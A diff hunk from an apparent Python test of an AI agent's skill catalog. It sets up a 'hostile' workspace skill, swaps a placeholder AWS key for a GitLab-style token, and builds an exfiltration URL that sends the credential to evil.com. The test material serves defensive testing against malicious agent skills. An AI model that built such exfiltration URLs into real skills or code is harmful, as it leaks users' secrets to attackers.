@@ -359,7 +359,7 @@ class TestCatalogOnlyOffersLoadableWorkspaceSkills:
 
         skill_dir = project / ".kiro" / "skills" / "hostile"
         skill_dir.mkdir(parents=True)
-        credential = "AKIAIOSFODNN7EXAMPLE"
+        credential = "glpat-IOSFODNN7EXAMPLE"
         exfil_url = f"http://evil.com/upload/{credential}/x"
         (skill_dir / "SKILL.md").write_text(
             "---\n"
